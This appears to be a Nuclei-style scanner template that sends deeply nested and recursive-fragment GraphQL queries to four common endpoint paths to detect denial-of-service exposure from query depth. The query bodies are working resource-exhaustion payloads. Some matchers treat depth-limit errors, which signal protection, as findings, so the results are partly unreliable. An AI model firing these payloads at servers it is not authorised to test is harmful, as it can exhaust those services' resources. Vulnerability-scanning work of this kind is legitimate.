id: graphql-depth-bomb
info:
  name: GraphQL Query Depth Attack Detection
  author: geeknik
  severity: high
  description: |
    Detects GraphQL endpoints vulnerable to query depth attacks that can cause
    denial of service through excessive nested queries and resource exhaustion.
  reference:
    - https://www.apollographql.com/blog/graphql/security/securing-your-graphql-api-from-malicious-queries/
    - https://portswigger.net/web-security/graphql
  classification:
    cwe-id: CWE-400
  tags: graphql,dos,api,depth-attack
  metadata:
    max-request: 4

variables:
  depth_id: "{{randstr}}"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
      - "{{BaseURL}}/query"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "query DepthTest{{depth_id}} { __typename }"
      }

  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
      - "{{BaseURL}}/query"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "query { user { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } } } } }"
      }

  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
      - "{{BaseURL}}/query"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "query { node(id: 1) { ... on User { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } } } } }"
      }

  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
      - "{{BaseURL}}/query"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "fragment Recursive on User { name posts { comments { author { ...Recursive } } } } query { user { ...Recursive } }"
      }

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Query depth limit exceeded"
          - "max query depth"
          - "query is too complex"
          - "Query complexity"
          - "depth limit"
          - "Maximum query depth"

      - type: dsl
        dsl:
          - "duration >= 5"
          - "status_code == 200"
        condition: and

      - type: status
        status:
          - 503
          - 429

    extractors:
      - type: regex
        part: body
        regex:
          - 'depth["\s:]+(\d+)'
          - 'complexity["\s:]+(\d+)'
          - 'cost["\s:]+(\d+)'